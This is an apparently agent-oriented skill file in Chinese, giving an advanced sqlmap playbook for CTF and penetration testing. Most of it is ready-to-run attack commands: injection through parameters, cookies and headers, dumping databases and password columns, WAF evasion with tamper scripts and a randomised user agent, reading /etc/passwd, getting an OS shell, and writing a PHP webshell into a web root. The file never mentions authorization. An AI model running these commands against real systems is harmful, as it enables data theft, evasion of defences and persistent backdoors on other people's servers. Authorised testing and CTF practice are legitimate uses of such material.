---
name: sqlmap-advanced
description: "sqlmap 高级用法完整参考。当确认存在 SQL 注入需要用 sqlmap 自动化利用时使用。覆盖 POST/Cookie/Header 注入、tamper 脚本选择、--technique 精确控制、二次注入(--second-url)、OS shell/文件读写、数据库提取优化、代理/编码配置。任何需要使用 sqlmap 的场景都应参考此 skill，包括 CTF 和渗透测试。与 sql-injection-methodology 配合使用——该 skill 负责手工检测和原理，本 skill 专注 sqlmap 工具用法"
metadata:
  tags: "sqlmap,sql injection,tool,tamper,bypass,waf,os-shell,file-read,file-write,数据库,注入工具"
  category: "tool"
---

# sqlmap 高级用法完整参考

## ⛔ 超时控制（强制执行）

sqlmap 可能运行很长时间。**必须用 timeout 包裹**：

```bash
timeout 480 sqlmap [参数] --batch 2>&1 | tee /tmp/sqlmap_output.log
# 超时后立即查看已有结果
tail -80 /tmp/sqlmap_output.log
```

---

## Phase 1: 基础检测

### GET 参数注入

```bash
timeout 480 sqlmap -u 'http://target/page.php?id=1' \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

### POST 参数注入

```bash
timeout 480 sqlmap -u 'http://target/login.php' \
    --data 'username=admin&password=test&submit=Login' \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

**关键**：`--data` 中包含所有表单字段（尤其 submit 按钮），PHP 常用 `isset($_POST['submit'])` 校验。

### Cookie 注入

```bash
timeout 480 sqlmap -u 'http://target/page.php' \
    --cookie 'user_id=1; session=abc123' \
    --level 3 \  # level ≥ 3 才测试 Cookie
    --batch --random-agent \
    2>&1 | tee /tmp/sqlmap_output.log
```

### HTTP Header 注入

```bash
timeout 480 sqlmap -u 'http://target/page.php' \
    --headers 'X-Forwarded-For: 127.0.0.1*' \
    --level 5 \  # level 5 测试所有 header
    --batch --random-agent \
    2>&1 | tee /tmp/sqlmap_output.log
```

星号 `*` 标记注入点位置。

### 从 Burp 请求文件

```bash
# 保存 Burp 拦截的请求到文件
timeout 480 sqlmap -r /tmp/request.txt \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## Phase 2: --technique 精确控制

| 字母 | 技术 | 适用场景 |
|------|------|----------|
| B | Boolean-based blind | 有布尔差异（页面内容变化） |
| E | Error-based | 有报错回显 |
| U | UNION query | 有数据回显 |
| S | Stacked queries | 支持分号（MySQL、MSSQL、PostgreSQL） |
| T | Time-based blind | 无任何差异（最后手段） |
| Q | Inline queries | 子查询注入 |

```bash
# 只用 UNION + Error（最快）
sqlmap -u 'URL' --technique EU --batch

# 只用布尔盲注（精确但慢）
sqlmap -u 'URL' --technique B --batch

# 跳过耗时的时间盲注
sqlmap -u 'URL' --technique BEUS --batch
```

**建议**：先用 `--technique EU` 快速检测，失败再加 `B`，最后才试 `T`。

---

## Phase 3: 数据提取

```bash
# 1. 列出所有数据库
sqlmap -u 'URL' --dbs --batch

# 2. 列出指定库的表
sqlmap -u 'URL' -D target_db --tables --batch

# 3. 列出指定表的列
sqlmap -u 'URL' -D target_db -T users --columns --batch

# 4. 提取数据
sqlmap -u 'URL' -D target_db -T users --dump --batch

# 5. 只取特定列
sqlmap -u 'URL' -D target_db -T users -C username,password --dump --batch

# 6. 限制行数（大表时）
sqlmap -u 'URL' -D target_db -T users --dump --start 1 --stop 10 --batch

# 7. 搜索关键表/列
sqlmap -u 'URL' --search -T flag --batch
sqlmap -u 'URL' --search -C password --batch
```

---

## Phase 4: WAF 绕过（tamper 脚本）

### tamper 选择速查

| 目标数据库 | 推荐 tamper 组合 |
|-----------|------------------|
| MySQL (通用) | `space2comment,between,randomcase` |
| MySQL (强 WAF) | `space2comment,equaltolike,greatest,halfversionedmorekeywords` |
| MSSQL | `space2comment,between,charencode` |
| PostgreSQL | `space2comment,between` |
| 通用编码绕过 | `charencode,chardoubleencode` |
| 内联注释 | `versionedmorekeywords,halfversionedmorekeywords` |

```bash
# 基础 WAF 绕过
timeout 480 sqlmap -u 'URL' \
    --tamper=space2comment,between,randomcase \
    --random-agent --batch \
    2>&1 | tee /tmp/sqlmap_output.log

# 强 WAF 绕过
timeout 480 sqlmap -u 'URL' \
    --tamper=space2comment,equaltolike,greatest,charencode \
    --random-agent --delay 1 --batch \
    2>&1 | tee /tmp/sqlmap_output.log
```

### 常用 tamper 脚本说明

| tamper | 作用 |
|--------|------|
| `space2comment` | 空格 → `/**/` |
| `between` | `>` → `BETWEEN` |
| `randomcase` | 关键字随机大小写 |
| `equaltolike` | `=` → `LIKE` |
| `charencode` | 字符 URL 编码 |
| `chardoubleencode` | 字符双重 URL 编码 |
| `greatest` | `>` → `GREATEST(x,y)` |
| `halfversionedmorekeywords` | MySQL 内联注释 |
| `apostrophenullencode` | `'` → `%00'` |
| `base64encode` | Base64 编码 payload |

---

## Phase 5: 高级利用

### OS Shell（获取系统命令执行）

```bash
# 条件：数据库用户有 FILE 权限 + 已知可写 Web 目录
timeout 480 sqlmap -u 'URL' --os-shell --batch \
    2>&1 | tee /tmp/sqlmap_output.log

# 指定 Web 根目录
sqlmap -u 'URL' --os-shell --web-root /var/www/html --batch
```

### 文件读写

```bash
# 读取文件
sqlmap -u 'URL' --file-read=/etc/passwd --batch

# 写入文件（上传 webshell）
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
sqlmap -u 'URL' --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php --batch
```

### SQL Shell

```bash
# 进入交互式 SQL 查询
sqlmap -u 'URL' --sql-shell --batch
```

### 二次注入 (Second-Order)

```bash
# 注入点和触发点不同
# --second-url: 注入后访问此 URL 检查结果
timeout 480 sqlmap -u 'http://target/register' \
    --data 'username=test&password=pass' \
    --second-url 'http://target/profile' \
    --batch --level 3 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## Phase 6: 性能调优

```bash
# 多线程（默认 1，提高到 10）
sqlmap -u 'URL' --threads 10 --batch

# 指定数据库类型（跳过指纹识别）
sqlmap -u 'URL' --dbms mysql --batch

# 指定注入点（跳过其他参数测试）
sqlmap -u 'URL' -p id --batch

# 使用代理
sqlmap -u 'URL' --proxy http://127.0.0.1:8080 --batch

# 通过 SOCKS5 代理（内网渗透）
sqlmap -u 'URL' --proxy socks5://127.0.0.1:1080 --batch

# 自定义 User-Agent
sqlmap -u 'URL' --user-agent 'Mozilla/5.0' --batch

# 保持会话
sqlmap -u 'URL' --cookie 'PHPSESSID=xxx' --batch

# 跟随重定向
sqlmap -u 'URL' --follow-redirect --batch
```

---

## 实战速查

| 场景 | 命令关键参数 |
|------|-------------|
| 快速检测 | `--technique EU --level 1 --risk 1` |
| 深度检测 | `--level 5 --risk 3` |
| POST 表单 | `--data 'param1=val1&param2=val2'` |
| Cookie 注入 | `--cookie 'x=1' --level 3` |
| WAF 环境 | `--tamper=space2comment,between --random-agent` |
| 读 flag 文件 | `--file-read=/flag.txt` |
| 写 webshell | `--file-write=shell.php --file-dest=/var/www/html/` |
| 拿系统 shell | `--os-shell` |
| 二次注入 | `--second-url URL` |
| 搜索 flag | `--search -T flag` 或 `--search -C flag` |

## 注意事项

- `--batch` 自动选择默认答案（必加，agent 无法交互）
- `--risk 3` 可能执行 UPDATE/DELETE，有风险环境慎用
- `timeout 480` 最多跑 8 分钟，超时检查已有结果
- sqlmap 会缓存结果，重跑同目标用 `--flush-session` 清除缓存
- 如果 sqlmap 检测不到注入但手工确认存在 → 用 `--prefix` 和 `--suffix` 手动指定闭合
